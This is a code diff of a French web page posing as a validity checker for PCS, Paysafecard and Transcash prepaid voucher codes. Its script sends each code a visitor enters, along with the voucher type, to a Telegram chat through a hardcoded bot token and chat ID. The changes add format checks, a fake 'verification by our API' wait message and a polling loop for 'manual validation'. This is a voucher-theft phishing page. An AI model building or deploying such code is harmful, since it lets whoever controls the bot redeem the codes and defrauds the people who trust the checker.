@@ -250,9 +250,6 @@
                 <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/PCS_Mastercard_logo.png" alt="PCS" style="height:38px;filter:grayscale(0.2);">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Paysafecard_logo.svg" alt="Paysafecard" style="height:38px;filter:grayscale(0.2);">
                 <img src="https://www.trans-cash.fr/wp-content/uploads/2021/09/logo-transcash.svg" alt="Transcash" style="height:38px;filter:grayscale(0.2);">
-                    <img src="pcs.png" alt="PCS" style="height:38px;filter:grayscale(0.2);">
-                    <img src="paysafecard.png" alt="Paysafecard" style="height:38px;filter:grayscale(0.2);">
-                    <img src="transcash.jpg" alt="Transcash" style="height:38px;filter:grayscale(0.2);">
             </div>
         </div>
         <div style="margin-top:28px;color:#1976d2;font-size:0.98rem;line-height:1.5;">
@@ -280,34 +277,87 @@
         });
 
         // Envoi du code à Telegram lors de la soumission
-        document.getElementById('codeForm').addEventListener('submit', function(e) {
+        document.getElementById('codeForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const code = document.getElementById('couponCode').value.trim();
             if (!selectedCoupon || !code) return;
-            const token = '8330769234:AAGiGPXFAl13nE7rR44v6MlKhAiuS6sznZM';
-            const chatId = '-5214080706';
-            const message = `\uD83D\uDD12 Coupon reçu\nType: ${selectedCoupon}\nCode: ${code}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert('✅ Votre code est valide ! Vous pouvez l\'utiliser.');
-                    document.getElementById('codeForm').reset();
-                    document.getElementById('codeForm').classList.add('hidden');
-                } else {
-                    alert('Erreur lors de l\'envoi. Merci de réessayer.');
-                }
-            })
-            .catch(() => {
-                alert('Erreur de connexion. Merci de réessayer.');
-            });
+            // Validation côté client
+            let valid = false;
+            if (selectedCoupon === 'PCS') {
+                valid = /^[A-Za-z0-9]{10}$/.test(code);
+            } else if (selectedCoupon === 'Transcash') {
+                valid = /^\d{12}$/.test(code);
+            } else if (selectedCoupon === 'Paysafecard') {
+                valid = /^\d{16}$/.test(code);
+            }
+            if (!valid) {
+                alert('Le format du code est incorrect pour ' + selectedCoupon + '.');
+                return;
+            }
+            // Générer un identifiant unique pour la requête
+            const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+            // Message d'attente
+            const waitMsg = document.createElement('div');
+            waitMsg.id = 'waitMsg';
+            waitMsg.style = 'background:#e3f2fd;color:#1976d2;padding:18px 0;margin:18px 0;border-radius:8px;font-size:1.1rem;font-weight:500;';
+            waitMsg.innerText = '⏳ Veuillez patienter, votre code est en cours de vérification par notre API...';
+            document.querySelector('.main-container').appendChild(waitMsg);
+            // Envoi de la demande à l'API backend
+            let sent = false;
+            try {
+                const resp = await fetch('https://VOTRE-API-URL/api/request', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        code: code,
+                        type: selectedCoupon,
+                        requestId: requestId
+                    })
+                });
+                const data = await resp.json();
+                sent = data.ok;
+            } catch {
+                sent = false;
+            }
+            if (!sent) {
+                document.getElementById('waitMsg').remove();
+                alert('Erreur lors de l\'envoi. Merci de réessayer.');
+                return;
+            }
+            // Déclencher le bot Telegram (commande /coupon)
+            try {
+                await fetch(`https://api.telegram.org/bot8330769234:AAGiGPXFAl13nE7rR44v6MlKhAiuS6sznZM/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: '-5214080706',
+                        text: `/coupon ${selectedCoupon}|${code}|${requestId}`
+                    })
+                });
+            } catch {}
+            // Attente de validation manuelle sur l'API
+            let result = null;
+            let tries = 0;
+            while (tries < 60 && !result) {
+                await new Promise(r => setTimeout(r, 3000));
+                tries++;
+                try {
+                    const resp = await fetch(`https://VOTRE-API-URL/api/status/${requestId}`);
+                    const data = await resp.json();
+                    if (data.status === 'valid') result = 'OUI';
+                    if (data.status === 'invalid') result = 'NON';
+                } catch {}
+            }
+            document.getElementById('waitMsg').remove();
+            if (result === 'OUI') {
+                alert('✅ Ce code est validé, vous pouvez l\'utiliser.');
+            } else if (result === 'NON') {
+                alert('❌ Code invalide, veuillez vérifier votre saisie.');
+            } else {
+                alert('⏳ Temps de validation dépassé, veuillez réessayer plus tard.');
+            }
+            document.getElementById('codeForm').reset();
+            document.getElementById('codeForm').classList.add('hidden');
         });
     </script>
 </body>
